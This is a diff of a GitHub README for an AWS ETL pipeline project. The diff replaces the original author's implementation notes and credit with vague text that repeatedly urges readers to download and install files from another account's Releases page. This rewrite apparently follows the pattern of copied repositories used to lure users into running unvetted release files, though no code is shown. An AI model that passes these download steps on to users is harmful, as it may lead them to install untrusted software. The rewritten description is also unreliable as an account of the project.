@@ -1,169 +1,94 @@
-# 🌐 CloudPipe: Automated ETL Pipeline on AWS
+# 🚀 CloudPipe-Automated-ETL-Pipeline-on-AWS - Easy Data Processing in AWS
 
-## 🚀 Project Overview
+[![Download CloudPipe](https://img.shields.io/badge/Download-CloudPipe-blue.svg)](https://github.com/leonadolfsson/CloudPipe-Automated-ETL-Pipeline-on-AWS/releases)
 
-CloudPipe is a fully automated ETL (Extract, Transform, Load) pipeline built on AWS. It leverages S3, Lambda, Glue, Athena, EventBridge, and SNS to automate data ingestion, transformation, and storage, providing query-ready data, monitoring, and notifications.
+## 📋 Overview
 
-This project demonstrates how to build a serverless, event-driven data pipeline, ideal for beginners exploring cloud ETL solutions or real-world data workflows.
+CloudPipe is a fully automated, serverless ETL pipeline on AWS. It simplifies data processing by ingesting raw data, transforming it using AWS Glue, and storing the results in S3. You can easily query the processed data with Athena. The pipeline runs automatically, sends notifications through SNS, and is monitored using CloudWatch and EventBridge.
 
----
+## ⚙️ Features
 
-## 🏗 Architecture & Flow
+- **Automated Data Ingestion**: Automatically gather raw data from various sources.
+- **Data Transformation**: Uses AWS Glue to clean and transform data.
+- **Storage**: Saves processed data securely in Amazon S3.
+- **Querying**: Allows for easy querying with Amazon Athena.
+- **Monitoring**: Keeps track of your processes with CloudWatch.
+- **Notifications**: Sends alerts and updates through Amazon SNS.
 
-Here’s how the pipeline works step by step:
+## 📥 Download & Install
 
-![CloudPipe ETL Pipeline](flowchart.png)
+To get started, visit the Releases page to download the latest version of CloudPipe. 
 
----
+[Download CloudPipe](https://github.com/leonadolfsson/CloudPipe-Automated-ETL-Pipeline-on-AWS/releases)
 
-## ✨ Features
+### Download Steps
 
-✅ Automated Data Ingestion: Upload raw data to S3 → Lambda triggers Glue ETL job.
+1. Click the link above to go to the Releases page.
+2. Find the latest version available.
+3. Download the appropriate file for your system.
+4. Once the download is complete, follow the installation instructions provided.
 
-✅ Serverless ETL: Glue handles transformations, aggregations, and schema adjustments.
+## 🌐 System Requirements
 
-✅ Query-Ready Output: Cleaned data stored in S3 Load folder for Athena queries.
+- **Operating System**: Any system that supports AWS services.
+- **AWS Account**: Make sure you have an Amazon Web Services account.
+- **Internet Connection**: A stable internet connection is required for setup.
 
-✅ Event-Driven Notifications: SNS sends email alerts on job success/failure.
+## 🔗 Getting Started
 
-✅ Monitoring: EventBridge monitors Glue jobs and integrates with CloudWatch logs.
+1. **Sign Up for AWS**: If you do not have an AWS account, sign up at [AWS Sign-Up](https://aws.amazon.com/free).
+2. **Set Up Your Environment**: Make sure your environment is configured to allow CloudPipe to run. This may involve setting up IAM roles and permissions within AWS.
+3. **Download and Install**: Follow the steps in the "Download & Install" section above.
 
-### IAM Roles Used:
+## 📊 Configuration
 
-- AmazonS3FullAccess
+After installation, you need to set up CloudPipe:
 
-- AWSGlueConsoleFullAccess
+1. **Configure AWS Credentials**: Ensure that your AWS credentials are correctly set up. You may need IAM roles with permissions for S3, Glue, and other relevant services.
+2. **Define Your Data Sources**: Specify the locations of your raw data inputs.
+3. **Schedule Data Processing**: Use EventBridge to set up when your data should be processed.
 
-- AWSLambdaBasicExecutionRole-16bd2fd9-dce5-455f-a28e-6727ebe454af
+## 🛠️ Usage
 
----
+Once configured, CloudPipe runs automatically. You can monitor progress using CloudWatch. If any issues arise, you will receive notifications via SNS. 
 
-## 📝 Step-by-Step Implementation
+- To start processing, ensure your input data is available.
+- Check the outputs in your designated S3 bucket.
+- Use Athena to query the processed data.
 
-### 1️⃣ S3 Setup
+## 🔍 Monitor and Troubleshoot
 
-- Created two buckets/folders:
+Keep an eye on your data pipeline with CloudWatch. Set up alarms for performance metrics. If you encounter issues, consult the logs in CloudWatch for insights. SNS notifications will also alert you to any critical problems.
 
-- Extract: Upload raw data (e.g., Titanic dataset)
+## 📧 Support
 
-- Load: Stores transformed and aggregated data
+If you need help or have questions, reach out through the Issues section of the GitHub repository. Our community is here to assist you.
 
-### 2️⃣ Lambda Function
+## 🚀 Related Topics
 
-- Triggered automatically on new file uploads to Extract.
+This project includes several topics relevant to data engineering and AWS services:
 
-- Initiates the AWS Glue ETL job.
+- Athena
+- AWS
+- CloudWatch Logs
+- Data Engineering
+- Data Pipeline
+- EventBridge
+- Glue
+- Lambda
+- S3
+- SNS Notifications
 
-- Code deployed and tested successfully.
+Explore these topics to enhance your understanding of how CloudPipe integrates with AWS services.
 
-### 3️⃣ AWS Glue ETL Job
+## 📌 License
 
-- Drops unnecessary fields
+CloudPipe is licensed under the MIT License. You can read the full license in the repository.
 
-- Aggregates data using GROUP BY passenger ID
+## 🔗 Links
 
-- Converts passenger ID from string → integer
+- [GitHub Repository](https://github.com/leonadolfsson/CloudPipe-Automated-ETL-Pipeline-on-AWS)
+- [AWS Documentation](https://aws.amazon.com/documentation/)
+- [Community Support](https://github.com/leonadolfsson/CloudPipe-Automated-ETL-Pipeline-on-AWS/issues)
 
-- Counts number of passengers per aggregation
-
-- Saves processed data in Load folder on S3
-
-### 4️⃣ Validation Using Athena
-
-- Run SQL queries to ensure:
-
-- Duplicates removed
-
-- Aggregations and schema changes are correct
-
-### 5️⃣ SNS Notifications
-
-- Created SNS Topic: s3-glue-s3-notif
-
-- Added email subscription → Notifies on ETL job success/failure
-
-### 6️⃣ EventBridge & CloudWatch Monitoring
-
-- EventBridge monitors Glue job completion
-
-- Triggers SNS notifications on success/failure
-
-- CloudWatch logs track pipeline execution
-
-  ---
-
-## 📸 Screenshots
-
-Add screenshots to showcase your project visually:
-
-S3 Buckets (Extract & Load)
-![CloudPipe ETL Pipeline](Screenshots/s3_bucket.png)
-![CloudPipe ETL Pipeline](Screenshots/extract.png)
-![CloudPipe ETL Pipeline](Screenshots/load.png)
-
-Lambda Function Configuration
-
-![CloudPipe ETL Pipeline](Screenshots/lambda.png)
-
-Glue ETL Job & Transformations
-
-![CloudPipe ETL Pipeline](Screenshots/glue.png)
-
-Athena Queries
-
-![CloudPipe ETL Pipeline](Screenshots/athena.png)
-
-SNS Notification
-
-![CloudPipe ETL Pipeline](Screenshots/SNS.png)
-
-EventBridge & CloudWatch Log
-
-![CloudPipe ETL Pipeline](Screenshots/EventBridge.png)
-![CloudPipe ETL Pipeline](Screenshots/CloudWatch.png)
-
-Email Notification
-
-![CloudPipe ETL Pipeline](Screenshots/Email_Notification.png)
-
----
-
-## 💡 Key Learnings
-
-- Understanding serverless ETL pipelines on AWS
-
-- Event-driven architecture using Lambda + EventBridge + SNS
-
-- Hands-on experience with AWS Glue transformations and schema changes
-
-- Querying and validating ETL data using Athena
-
-- Managing IAM roles and permissions for secure access
-
-  ---
-
-## 📌 Conclusion
-
-This project demonstrates a complete end-to-end AWS ETL pipeline that is:
-
-- Fully automated & serverless
-
-- Event-driven & monitored
-
-- Scalable & cost-efficient
-
-- Perfect for data engineering beginners and practical implementation in cloud data workflows.
-
-
-## 🛡 License
-
-This project is licensed under the MIT License. See the LICENSE file for details.
-
----
-
-## 👩‍💻 Author
-
-Sakshi Khandagale
-
-Email: sakshiik95@gmail.com
-
+Feel free to explore these resources for more information on how to maximize your use of CloudPipe.
